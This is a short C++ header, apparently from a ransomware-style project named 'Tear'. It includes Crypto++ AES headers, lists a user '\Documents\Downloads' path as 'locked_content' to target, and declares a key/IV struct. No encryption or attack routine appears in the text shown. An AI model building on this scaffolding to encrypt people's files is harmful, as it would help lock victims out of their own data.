#ifndef TEAR_H
#define TEAR_H

#define EMPTY ""
#define LOCKED_CONTENT_NUM 1


//#include <boost/filesystem/operations.hpp>

#include <cryptopp/default.h>
#include <cryptopp/osrng.h>
#include <cryptopp/cryptlib.h>
#include <cryptopp/hex.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>
#include <cryptopp/aes.h>
#include <cryptopp/ccm.h>
#include <string.h>

const std::string locked_content[LOCKED_CONTENT_NUM] = { "\\Documents\\Downloads" };

#define IV_LEN CryptoPP::AES::BLOCKSIZE

struct crypt_data
{
	byte key[KEY_LEN];
	byte iv[IV_LEN];
};

#endif
